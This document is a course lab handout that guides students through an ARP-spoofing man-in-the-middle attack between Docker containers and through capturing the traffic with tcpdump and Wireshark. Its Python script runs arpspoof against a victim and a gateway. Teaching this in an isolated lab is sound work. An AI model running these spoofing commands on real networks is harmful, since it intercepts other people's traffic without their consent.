

# Network Security Lab: Man-in-the-Middle Attack Simulation with Docker

## Introduction
In this lab, you will simulate a Man-in-the-Middle (MITM) attack using Docker and Docker Compose. The goal is to set up two virtual machines: one representing a victim and the other an attacker, connected through a common network. You will use Wireshark to analyze network traffic and a custom script to mimic the behavior of Winarp.exe to carry out an ARP spoofing attack.

## Prerequisites
Before starting this lab, make sure you have the following installed:
- Docker Desktop (supports both x86 and Apple Silicon)
- Wireshark (for network traffic analysis)
- Basic understanding of ARP spoofing and networking concepts

## Lab Setup

### Step 1: Install Docker Desktop
Docker Desktop is required to simulate the victim and attacker machines. If you haven’t installed Docker Desktop, follow the installation instructions here: [Docker Desktop Installation](https://docs.docker.com/desktop/).

Once installed, verify that both Docker and Docker Compose are working by running:


```bash
docker --version
docker-compose --version
```

### Step 2: Clone the Lab Repository
The lab environment is available as a Docker Compose configuration. Clone the repository to your local machine using:

```bash
git clone https://github.com/ncat-grad-development/comp726-hw1-alt
```

```bash
cd comp726-hw1-alt
```
```bash
cd mitm-docker
```

### Step 3: Docker Compose Configuration
The following `docker-compose.yml` sets up two containers (victim and attacker) connected through a common network. The attacker container will have elevated network permissions to simulate an MITM attack.

```yaml
version: '3'
services:
  victim:
    image: ubuntu:latest
    container_name: victim
    command: bash -c "apt-get update && apt-get install -y vim tcpdump && sleep infinity"
    networks:
      - mitm_net
    cap_add:
      - NET_RAW

  attacker:
    image: ubuntu:latest
    container_name: attacker
    command: bash -c "apt-get update && apt-get install -y vim tcpdump && sleep infinity"
    networks:
      - mitm_net
    cap_add:
      - NET_ADMIN
    volumes:
      - ./mitm_script.py:/home/ubuntu/mitm_script.py

networks:
  mitm_net:
    driver: bridge
```
### Step 4o: Gather Network Infomation
Run the following command. Take note of each IP address

```bash
echo "Attacker IP: $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' attacker)"; \
echo "Victim IP: $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' victim)"; \
echo "Gateway IP: $(docker inspect -f '{{range .NetworkSettings.Networks}}{{.Gateway}}{{end}}' attacker)"
```

### Step 4: MITM Attack Script
The following script simulates the ARP spoofing attack. It should be executed in the attacker container.


```python
# Basic Python script to simulate MITM setup
import os

victim_ip = input("Enter victim IP: ")
gateway_ip = input("Enter gateway IP: ")

# Run ARP spoofing (this needs to be done in the attacker container)
os.system(f"arpspoof -i eth0 -t {victim_ip} {gateway_ip}")
os.system(f"arpspoof -i eth0 -t {gateway_ip} {victim_ip}")
```

### Step 5: Run the Lab Environment
Once you have the `docker-compose.yml` file and the MITM script in place, you can start the lab environment using the following command:

```bash
docker-compose up
```

This will start two containers: `victim` and `attacker`, both connected through a common network.

### Step 6: Launch the Attack
To launch the MITM attack, follow these steps:

1. Open a terminal window for the attacker container:
   ```bash
   docker exec -it attacker bash -c "cd /home/ubuntu && bash"
   ```

2. Run the MITM Python script inside the attacker container. The script will prompt you to enter the victim's IP and the gateway IP.

   Assuming your victim container has an IP of `172.18.0.2` and the gateway has an IP of `172.18.0.1`, you would run:
   ```bash
   python3 mitm_script.py
   ```

   Then, input the victim IP and gateway IP as prompted:
   ```bash
   Enter victim IP: 172.18.0.2 # use IP address from Step 4o
   Enter gateway IP: 172.18.0.1 # use IP address from Step 4o
   ```

   This will initiate the ARP spoofing attack.

### Step 7: Generate Network Traffic on the Victim
You can simulate network traffic from the victim container by running basic network commands like `ping` or `curl`:

1. Open a terminal for the victim container:
   ```bash
   docker exec -it victim bash -c "cd /home/ubuntu && bash"
   ```

2. Use the `ping` command to generate network traffic:
   ```bash
   ping 172.18.0.1  # Gateway IP
   ```

3. You can also try `curl` to generate HTTP requests:
   ```bash
   curl http://ncat.edu
   ```



### Step 8: Use `tcpdump` to Analyze Traffic

1. **Install `tcpdump`**:
   If `tcpdump` is not already installed in the attacker container, install it using the following command:
   ```bash
   apt-get update && apt-get install -y tcpdump
   ```

2. **Capture traffic on the Docker bridge network**:
   Start capturing traffic in the attacker container on the `eth0` interface (or the relevant interface for the container). Run the following command in the attacker container:
   ```bash
   tcpdump -i eth0 -w mitm_capture.pcap
   ```

   This will capture all traffic on the interface `eth0` and save it to the file `mitm_capture.pcap`.

3. **Analyze captured traffic**:
   After capturing the traffic, you can transfer the `.pcap` file to your local machine for analysis using a tool like Wireshark, or you can analyze it directly from the command line using `tcpdump`:

   - To view the contents of the capture file:
     ```bash
     tcpdump -r mitm_capture.pcap
     ```

   - To filter ARP traffic only:
     ```bash
     tcpdump -r mitm_capture.pcap arp
     ```

4. **Transferring the `.pcap` file**:
   If you need to analyze the capture in Wireshark (on a GUI machine), you can copy the `.pcap` file to your host machine. For example, using `docker cp`:
   ```bash
   docker cp attacker:/path/to/mitm_capture.pcap ./mitm_capture.pcap
   ```

   Then, you can open the `mitm_capture.pcap` file in Wireshark for further analysis.

### Step 9: Clean Up
When you are done with the lab, you can stop and remove the Docker containers by running:

```bash
docker-compose down
```

## Conclusion
In this lab, you successfully simulated a Man-in-the-Middle attack using Docker and Docker Compose. You learned how ARP spoofing works and used `tcpdump` to analyze the network traffic. Be sure to review the captured traffic to fully understand how MITM attacks can be executed and detected.

